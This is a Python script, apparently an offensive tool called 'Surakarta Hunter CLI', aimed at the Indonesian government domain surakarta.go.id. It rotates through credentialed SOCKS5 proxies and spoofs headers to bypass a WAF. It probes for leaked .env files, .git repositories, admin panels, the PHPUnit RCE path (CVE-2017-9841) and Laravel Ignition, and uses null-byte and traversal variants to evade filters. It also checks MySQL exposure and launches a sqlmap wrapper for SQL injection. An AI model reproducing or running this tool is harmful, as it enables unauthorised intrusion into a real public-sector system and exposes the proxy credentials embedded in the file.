import requests
import socks
import socket
import sys
import random
import time
import subprocess
import threading

# --- CONFIGURATION ---
TARGET_DOMAIN = "surakarta.go.id"
PROXIES = [
    "23.95.150.145:6114:oyyvimta:3olvpyzbkfhq",
    "198.23.239.134:6540:oyyvimta:3olvpyzbkfhq",
    "107.172.163.27:6543:oyyvimta:3olvpyzbkfhq",
    "198.105.121.200:6462:oyyvimta:3olvpyzbkfhq",
    "64.137.96.74:6641:oyyvimta:3olvpyzbkfhq",
    "216.10.27.159:6837:oyyvimta:3olvpyzbkfhq",
    "23.26.71.145:5628:oyyvimta:3olvpyzbkfhq"
]

# WAF Bypass Headers
BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"}
]

PATHS_TO_SCAN = [
    ("/.env", "Laravel Configuration File"),
    ("/public/.env", "Public Laravel Config"),
    ("/.git/HEAD", "Exposed .git Repository"),
    ("/public/up/", "Exposed Upload Directory"),
    (":8080/login/", "ISPConfig Admin Panel"),
    ("/phpmyadmin/", "Database Admin"),
    ("/admin/", "General Admin Panel"),
    # Advanced Evasion & CVE Checks
    ("/.env%00", "Laravel Config (Null Byte)"),
    ("/.env;", "Laravel Config (Semicolon Bypass)"),
    ("/public/..%2f.env", "Laravel Config (Directory Traversal)"),
    ("/storage/logs/laravel.log", "Laravel Log File (Info Leak)"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "PHPUnit RCE (CVE-2017-9841)"),
    ("/_ignition/health-check", "Ignition Debug Mode (RCE Candidate)")
]

# --- UTILS ---
def get_random_proxy():
    p = random.choice(PROXIES).split(":")
    return (p[0], int(p[1]), p[2], p[3])

def set_proxy():
    ip, port, user, pwd = get_random_proxy()
    socks.set_default_proxy(socks.SOCKS5, ip, port, username=user, password=pwd)
    socket.socket = socks.socksocket
    print(f"[*] Proxy Switched: {ip}:{port}")

def banner():
    print("""
    ╔══════════════════════════════════════╗
    ║      SURAKARTA HUNTER CLI v1.0       ║
    ║   Automated Vulnerability Scanner    ║
    ╚══════════════════════════════════════╝
    """)

# --- MODULES ---

def scan_web():
    print("\n[+] Starting Web Vulnerability Scan...")
    
    # We need to rebuild the session/socket for each request ideally to rotate proxy,
    # but for stability we set it once globally for this thread or function.
    set_proxy() 
    
    for path, desc in PATHS_TO_SCAN:
        full_url = f"https://{TARGET_DOMAIN}{path}"
        if path.startswith(":"): # Handle port 8080
            full_url = f"https://{TARGET_DOMAIN}{path}"
        
        print(f"[*] Checking {desc} ({full_url})...")
        
        try:
            # WAF Bypass Attempt
            headers = {"User-Agent": "Mozilla/5.0"}
            headers.update(random.choice(BYPASS_HEADERS))
            
            r = requests.get(full_url, headers=headers, verify=False, timeout=10)
            
            status = r.status_code
            if status == 200:
                print(f"    [!!!] VULNERABLE! Found {desc} (200 OK)")
                print(f"    [>] Payload: {headers}")
            elif status == 403:
                print(f"    [-] Forbidden (WAF Blocked)")
            else:
                print(f"    [?] Status: {status}")
                
        except Exception as e:
            print(f"    [!] Connection Error: {e}")

def probe_mysql():
    print("\n[+] Probing MySQL Port (3306)...")
    set_proxy()
    target_ip = TARGET_DOMAIN
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        result = s.connect_ex((target_ip, 3306))
        
        if result == 0:
            print("    [!] MySQL Port 3306 is OPEN (Reachable via Proxy)")
            print("    [>] Recommendation: Run 'sqlmapauto.py' with --dbms=mysql")
        else:
            print("    [-] MySQL Port 3306 appears closed or unreachable.")
        s.close()
    except Exception as e:
        print(f"    [!] Error probing MySQL: {e}")

def run_sqli_scan():
    print("\n[+] SQL Injection Scanner Integration")
    url = input("    [?] Enter target URL (e.g., http://surakarta.go.id/news?id=1): ")
    if url:
        print("    [*] Launching sqlmapauto...")
        # Call the existing sqlmapauto.py script
        subprocess.run([sys.executable, "sqlmapauto.py", url])

# --- MAIN ---
if __name__ == "__main__":
    banner()
    
    # 1. Web Scan
    scan_web()
    
    # 2. MySQL Probe
    probe_mysql()
    
    # 3. Optional SQLi
    print("\n[?] Do you want to run detailed SQLMap scan? (y/n)")
    choice = input("    > ").lower()
    if choice == 'y':
        run_sqli_scan()
    
    print("\n[=] Scan Complete.")
